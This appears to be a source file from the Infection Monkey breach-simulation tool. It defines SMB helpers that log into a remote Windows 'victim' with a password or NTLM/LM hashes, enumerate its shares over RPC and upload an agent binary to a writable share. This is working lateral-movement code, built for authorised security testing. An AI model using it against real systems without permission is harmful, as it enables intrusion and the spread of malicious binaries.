import logging
import ntpath
import pprint
from io import BytesIO
from pathlib import PurePath
from typing import Any, Dict, Optional, Tuple

from impacket.dcerpc.v5 import srvs, transport
from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21
from impacket.smbconnection import SMB_DIALECT, SMBConnection
from pydantic import SecretStr

from common.credentials import get_plaintext
from infection_monkey.utils.brute_force import get_credential_string

logger = logging.getLogger(__name__)


# Note: If the SMB server has the `RequireSecuritySignature` or`EnableSecuritySignature` settings
#       enabled, tranfer speeds will slow to a crawl. See
#       https://github.com/guardicore/monkey/issues/1923 for more information.
class SmbTools(object):
    @staticmethod
    def copy_file(
        host,
        agent_file: BytesIO,
        dst_path: PurePath,
        username: str,
        password: SecretStr,
        lm_hash="",
        ntlm_hash="",
        timeout=30,
    ) -> Optional[str]:
        creds_for_log = get_credential_string([username, password, lm_hash, ntlm_hash])
        logger.debug(f"Attempting to copy an agent binary to {host} using SMB with {creds_for_log}")

        smb, dialect = SmbTools.new_smb_connection(
            host, username, password, lm_hash, ntlm_hash, timeout
        )
        if not smb:
            return None

        # skip guest users
        if smb.isGuestSession() > 0:
            logger.info(f"Connection to {host} granted guest privileges with {creds_for_log}")

            try:
                smb.logoff()
            except Exception:
                pass

            return None

        try:
            resp = SmbTools.execute_rpc_call(smb, "hNetrServerGetInfo", 102)
        except Exception as exc:
            logger.debug("Error requesting server info from %r over SMB: %s", host, exc)
            return None

        info = {
            "major_version": resp["InfoStruct"]["ServerInfo102"]["sv102_version_major"],
            "minor_version": resp["InfoStruct"]["ServerInfo102"]["sv102_version_minor"],
            "server_name": resp["InfoStruct"]["ServerInfo102"]["sv102_name"].strip("\0 "),
            "server_comment": resp["InfoStruct"]["ServerInfo102"]["sv102_comment"].strip("\0 "),
            "server_user_path": resp["InfoStruct"]["ServerInfo102"]["sv102_userpath"].strip("\0 "),
            "simultaneous_users": resp["InfoStruct"]["ServerInfo102"]["sv102_users"],
        }

        logger.debug("Connected to %r using %s:\n%s", host, dialect, pprint.pformat(info))

        try:
            resp = SmbTools.execute_rpc_call(smb, "hNetrShareEnum", 2)
        except Exception as exc:
            logger.debug("Error enumerating server shares from %r over SMB: %s", host, exc)
            return None

        resp = resp["InfoStruct"]["ShareInfo"]["Level2"]["Buffer"]

        high_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        low_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        file_name = dst_path.name

        for i in range(len(resp)):
            share_name = resp[i]["shi2_netname"].strip("\0 ")
            share_path = resp[i]["shi2_path"].strip("\0 ")
            current_uses = resp[i]["shi2_current_uses"]
            max_uses = resp[i]["shi2_max_uses"]

            if current_uses >= max_uses:
                logger.debug(
                    "Skipping share '%s' on victim %r because max uses is exceeded",
                    share_name,
                    host,
                )
                continue
            elif not share_path:
                logger.debug(
                    "Skipping share '%s' on victim %r because share path is invalid",
                    share_name,
                    host,
                )
                continue

            share_info = {"share_name": share_name, "share_path": share_path}

            if str(dst_path).lower().startswith(share_path.lower()):
                high_priority_shares += (
                    (ntpath.sep + str(dst_path)[len(share_path) :], share_info),
                )

            low_priority_shares += ((ntpath.sep + file_name, share_info),)

        shares = high_priority_shares + low_priority_shares

        file_uploaded = False
        remote_full_path = None

        for remote_path, share in shares:
            share_name = share["share_name"]
            share_path = share["share_path"]

            if not smb:
                smb, _ = SmbTools.new_smb_connection(
                    host, username, password, lm_hash, ntlm_hash, timeout
                )
                if not smb:
                    return None

            try:
                smb.connectTree(share_name)
            except Exception as exc:
                logger.error(
                    f'Error connecting tree to share "{share_name}" on victim {host}: {exc}'
                )
                continue

            logger.debug(
                "Trying to copy monkey file to share '%s' [%s + %s] on victim %r",
                share_name,
                share_path,
                remote_path,
                host,
            )

            remote_full_path = ntpath.join(share_path, remote_path.strip(ntpath.sep))

            try:
                smb.setTimeout(timeout)
                smb.putFile(share_name, remote_path, agent_file.read)

                file_uploaded = True
                logger.info(
                    "Copied monkey agent to remote share '%s' [%s] on victim %r",
                    share_name,
                    share_path,
                    host,
                )

                break
            except Exception as exc:
                logger.error(
                    "Error uploading monkey to share '%s' on victim %r: %s", share_name, host, exc
                )
                continue
            finally:
                try:
                    smb.logoff()
                except Exception:
                    pass

                smb = None

        if not file_uploaded:
            logger.debug(
                f"Couldn't find a writable share for exploiting victim {host} with "
                f'user "{username}"'
            )
            return None

        return remote_full_path

    @staticmethod
    def new_smb_connection(
        host, username: str, password: SecretStr, lm_hash="", ntlm_hash="", timeout=30
    ):
        try:
            smb = SMBConnection(str(host.ip), str(host.ip), sess_port=445)
        except Exception as exc:
            logger.debug(
                "SMB connection to %r on port 445 failed," " trying port 139 (%s)", host, exc
            )

            try:
                smb = SMBConnection("*SMBSERVER", str(host.ip), sess_port=139)
            except Exception as exc:
                logger.debug("SMB connection to %r on port 139 failed as well (%s)", host, exc)
                return None, None

        dialect = {
            SMB_DIALECT: "SMBv1",
            SMB2_DIALECT_002: "SMBv2.0",
            SMB2_DIALECT_21: "SMBv2.1",
        }.get(smb.getDialect(), "SMBv3.0")

        # we know this should work because the WMI connection worked
        try:
            smb.login(
                username,
                get_plaintext(password),
                "",
                get_plaintext(lm_hash),
                get_plaintext(ntlm_hash),
            )
        except Exception as exc:
            logger.error(f'Error while logging into {host} using user "{username}": {exc}')
            return None, dialect

        smb.setTimeout(timeout)
        return smb, dialect

    @staticmethod
    def execute_rpc_call(smb, rpc_func, *args):
        dce = SmbTools.get_dce_bind(smb)
        rpc_method_wrapper = getattr(srvs, rpc_func, None)
        if not rpc_method_wrapper:
            raise ValueError("Cannot find RPC method '%s'" % (rpc_method_wrapper,))

        return rpc_method_wrapper(dce, *args)

    @staticmethod
    def get_dce_bind(smb):
        rpctransport = transport.SMBTransport(
            smb.getRemoteHost(), smb.getRemoteHost(), filename=r"\srvsvc", smb_connection=smb
        )
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(srvs.MSRPC_UUID_SRVS)

        return dce
